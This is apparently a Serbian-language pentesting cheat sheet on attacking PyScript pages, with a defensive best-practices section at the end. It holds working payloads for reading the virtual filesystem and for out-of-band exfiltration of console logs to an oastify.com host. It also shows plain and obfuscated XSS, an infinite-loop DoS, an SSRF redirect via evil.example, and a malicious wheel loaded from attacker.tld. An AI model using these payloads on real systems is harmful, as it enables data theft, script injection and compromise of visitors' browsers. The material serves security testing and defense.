# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript vodič za Pentesting

PyScript je novi framework razvijen za integraciju Python-a u HTML, tako da može da se koristi zajedno sa HTML-om. U ovom cheat sheet-u pronaći ćete kako da koristite PyScript za potrebe penetration testing-a.

### Dumping / Preuzimanje fajlova iz Emscripten virtuelnog memorijskog filesystem-a:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Rezultat:

![PyScript Pentesting Guide - Dumping / Retrieving files from the Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB eksfiltracija podataka iz Emscripten virtuelnog memorijskog sistema datoteka (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Kod:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Rezultat:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Obični)

Kod:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Rezultat:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Rezultat:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Rezultat:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS napad (beskonačna petlja)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS napad (beskonačna petlja)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Rezultat:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nove ranjivosti i tehnike (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0` ignoriše parametre `redirect` i `retries` kada se izvršava **unutar Pyodide runtime-a** koji dolazi sa PyScript-om. Kada napadač može da utiče na ciljne URL-ove, može primorati Python kod da prati preusmeravanja između domena čak i kada ih je developer izričito onemogućio - čime se efektivno zaobilazi anti-SSRF logika.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Zakrpano u `urllib3 2.5.0` – nadogradite paket u svojoj PyScript slici ili navedite bezbednu verziju u `packages = ["urllib3>=2.5.0"]`. Pogledajte zvanični CVE unos za detalje.

### Učitavanje proizvoljnih paketa i napadi na lanac snabdevanja

Pošto PyScript dozvoljava proizvoljne URL-ove na listi `packages`, zlonamerni akter koji može da izmeni ili ubaci konfiguraciju može da izvrši **potpuno proizvoljni Python** u pregledaču žrtve:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Potrebni su samo pure-Python wheels – korak kompilacije WebAssembly nije potreban.* Uverite se da konfiguraciju ne kontroliše korisnik i hostujte pouzdane wheels na sopstvenom domenu uz HTTPS i SRI hashes.

### Promene u sanitizaciji izlaza (2023+)

* `print()` i dalje ubacuje sirov HTML i zato je podložan XSS-u (primeri iznad).
* Noviji pomoćni alat `display()` podrazumevano escape-uje HTML – sirovi markup mora biti obuhvaćen sa `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Ovo ponašanje je uvedeno 2023. godine i dokumentovano je u zvaničnom vodiču Built-ins. Za nepouzdan unos koristite `display()` i izbegavajte direktno pozivanje `print()`.<sup>[[2]](#references)</sup>

---

## Najbolje prakse za odbranu

* **Održavajte pakete ažurnim** – nadogradite na `urllib3 >= 2.5.0` i redovno ponovo izgrađujte wheels koji se isporučuju sa sajtom.
* **Ograničite izvore paketa** – referencirajte samo PyPI nazive ili URL-ove sa istog porekla, idealno zaštićene pomoću Sub-resource Integrity (SRI).
* **Ojačajte Content Security Policy** – onemogućite ugrađeni JavaScript (`script-src 'self' 'sha256-…'`) kako ubačeni `<script>` blokovi ne bi mogli da se izvrše.
* **Onemogućite korisnički dostavljene `<py-script>` / `<script type="py">` tagove** – sanitizujte HTML na serveru pre nego što ga prosledite drugim korisnicima.
* **Izolujte workere** – ako vam nije potreban sinhroni pristup DOM-u iz workera, omogućite zastavicu `sync_main_only` da biste izbegli zahteve za zaglavlja `SharedArrayBuffer`.

## Reference

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript dokumentacija za Built-ins – `display` i `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
